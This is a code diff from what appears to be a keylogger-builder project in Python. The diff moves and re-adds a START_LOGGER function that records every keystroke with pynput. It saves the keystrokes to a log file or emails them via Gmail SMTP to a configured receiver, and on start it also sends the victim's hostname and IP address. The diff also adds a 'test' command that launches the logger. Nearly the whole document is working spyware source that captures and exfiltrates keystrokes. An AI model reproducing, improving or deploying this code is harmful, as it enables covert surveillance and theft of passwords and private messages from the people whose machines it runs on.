@@ -37,7 +37,11 @@ def printlogo():
     ╚═════╝░╚═╝░░╚═╝╚══════
         """)
     
-    
+
+SendMail = bool
+
+keys = []
+keys_pressed = 0
 
 
 
@@ -183,6 +187,107 @@ class newConfig():
      
 
 
+def START_LOGGER():
+    from pynput.keyboard import Key, Listener
+    import smtplib, ssl
+    import socket   
+    
+        
+    
+
+    def getIP():
+        hostname=socket.gethostname()   
+        IPAddr=socket.gethostbyname(hostname)   
+        return hostname, IPAddr
+
+
+
+    with open(f"{JsonPath}","r") as file:
+        parsed = json.load(file)
+        Jsender_email = parsed["sender_email"]
+        Jsender_password = parsed["sender_password"]
+        Jreceiver_email = parsed["receiver_email"]
+
+        mode = parsed['mode']
+    Key_mode = True
+    Email_mode = False
+        
+    if mode == "email":
+        Key_mode = False
+        Email_mode = True
+    elif mode == "local":
+        Key_mode = True
+        Email_mode = False
+    def email(keysGiven):
+        port = 465  # For SSL
+        smtp_server = "smtp.gmail.com"
+        sender_email = Jsender_email
+        receiver_email = Jreceiver_email  
+        password = Jsender_password
+        message = f"""\
+            Subject: KEYS 
+
+        {keysGiven}."""
+
+        context = ssl.create_default_context()
+        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
+            server.login(sender_email, password)
+            server.sendmail(sender_email, receiver_email, message)
+ 
+   
+    def on_press(key):
+        global keys
+        global keys_pressed  
+        emailBool = False
+        keypressed = key
+        if keypressed == Key.space:
+            keypressed = "   "
+        elif keypressed == Key.backspace:
+            keypressed= "<== "
+            keys_pressed =- 2
+        elif keypressed == Key.enter:
+            keypressed = "\n"
+            emailBool = True
+        elif keypressed == "'":
+            keypressed = "_Apostro4phe_"
+        elif str(keypressed).startswith("Key."):
+            keypressed = ""
+            keys_pressed =- 2
+        keys.append(str(keypressed))
+        keys_pressed += 1
+        if keys_pressed > 20 and Key_mode == True:   
+            file = open(f"./out/Spicy-Logs++", "a") 
+            UNmessage = "".join(keys)
+            message = UNmessage.replace("'","")
+            message = message.replace("_Apostro4phe_","'")
+            file.write(str(message))
+            keys_pressed = 0 
+            keys = []
+        if emailBool == True and Email_mode == True:
+            UNmessage = "".join(keys)
+            message = UNmessage.replace("'","")
+            message = message.replace("_Apostro4phe_","'")
+            email(message)
+            emailBool = False
+            keys = []
+    def isMaillable():
+        global SendMail
+        try:
+            host_Data = getIP()
+            email(f"Started Process || {host_Data}")
+            SendMail = True 
+        except:
+            SendMail = False
+            print(SendMail)
+    with Listener(on_press=on_press) as listener :
+        isMaillable()
+        listener.join()
+
+
+
+
+
+
 
 
 
@@ -237,6 +342,11 @@ def __main__():
            status.write(random.randint(10000,99999))
         except:
             print(bcolors.FAIL + "Failed to compile KeyLogger.\n Please make sure SKlogger.py is in the directory of this file.")
+    elif CONSOLE.lower() == "test":
+        try:
+            START_LOGGER()
+        except:
+            print("Something went wrong when loading the keylogger.")
 
 
        
@@ -258,125 +368,6 @@ printlogo()
 __main__()
 
 print(bcolors.WHITE)
-
-
-
-def START_LOGGER():
-    from pynput.keyboard import Key, Listener
-    import smtplib, ssl
-    import json
-    import socket   
-    
-    
-    def checkConfig():
-        with open(f"{JsonPath}/config.json") as ef:
-            parsed = json.load(ef)
-
-
-            try:
-                Mode = parsed["mode"]
-            except:
-                print(bcolors.FAIL + bcolors.BOLD + "FAILURE!\nyour mode is not setup. please use the command 'mode' to set it up")
-            try:
-                senderEmail = parsed["sender_email"]
-                senderPassword = parsed["sender_password"]
-                recieverEmail = parsed["receiver_email"]
-            except:
-                print(bcolors.FAIL + bcolors.BOLD + "FAILURE!\nyour Email Config is not setup. please use the command 'config' to set it up")
-                
-                
-    
-    
-
-    def getIP():
-        hostname=socket.gethostname()   
-        IPAddr=socket.gethostbyname(hostname)   
-        return hostname, IPAddr
-
-
-
-    with open(f"{JsonPath}","r") as file:
-        parsed = json.load(file)
-        Jsender_email = parsed["sender_email"]
-        Jsender_password = parsed["sender_password"]
-        Jreceiver_email = parsed["receiver_email"]
-
-        mode = parsed['mode']
-    Key_mode = True
-    Email_mode = False
-        
-    if mode == "email":
-        Key_mode = False
-        Email_mode = True
-    elif mode == "local":
-        Key_mode = True
-        Email_mode = False
-    def email(keysGiven):
-        port = 465  # For SSL
-        smtp_server = "smtp.gmail.com"
-        sender_email = Jsender_email
-        receiver_email = Jreceiver_email  
-        password = Jsender_password
-        message = f"""\
-            Subject: KEYS 
-
-        {keysGiven}."""
-
-        context = ssl.create_default_context()
-        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
-            server.login(sender_email, password)
-            server.sendmail(sender_email, receiver_email, message)
-    keys_pressed = 0
-    SendMail = bool
-    keys = []
-    def on_press(key):
-        global keys_pressed
-        global keys
-        emailBool = False
-        keypressed = key
-        if keypressed == Key.space:
-            keypressed = "   "
-        elif keypressed == Key.backspace:
-            keypressed= "<== "
-            keys_pressed =- 2
-        elif keypressed == Key.enter:
-            keypressed = "\n"
-            emailBool = True
-        elif keypressed == "'":
-            keypressed = "_Apostro4phe_"
-        elif str(keypressed).startswith("Key."):
-            keypressed = ""
-            keys_pressed =- 2
-        keys.append(str(keypressed))
-        keys_pressed += 1
-        if keys_pressed > 20 and Key_mode == True:   
-            file = open(f"./out/Spicy-Logs++", "a") 
-            UNmessage = "".join(keys)
-            message = UNmessage.replace("'","")
-            message = message.replace("_Apostro4phe_","'")
-            file.write(str(message))
-            keys_pressed = 0 
-            keys = []
-        if emailBool == True and Email_mode == True:
-            UNmessage = "".join(keys)
-            message = UNmessage.replace("'","")
-            message = message.replace("_Apostro4phe_","'")
-            if SendMail == True:
-                email(message)
-            emailBool = False
-            keys = []
-    def isMaillable():
-        global SendMail
-        try:
-            host_Data = getIP()
-            email(f"Started Process || {host_Data}")
-            SendMail = True 
-        except:
-            SendMail = False
-            print(SendMail)
-    with Listener(on_press=on_press) as listener :
-        isMaillable()
-        listener.join()
 
 
 
